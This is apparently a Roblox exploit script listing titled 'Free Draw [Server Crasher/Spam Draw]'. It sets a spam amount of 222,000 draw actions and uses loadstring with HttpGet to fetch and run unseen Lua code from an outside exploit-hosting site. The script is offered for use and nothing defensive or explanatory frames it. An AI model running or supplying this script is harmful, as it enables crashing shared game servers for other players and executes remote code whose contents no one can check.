title: Free Draw [Server Crasher/Spam Draw]
script:
local Settings = {
    SpamAmount = 222000,
    Color = Color3.new(1,1,1),
    Transparency = 1,
    Thickness = 0.05,
    AntiLag = true
}
loadstring(game:HttpGet("https://naikoexploit.vercel.app/FreeDraw"))(Settings)
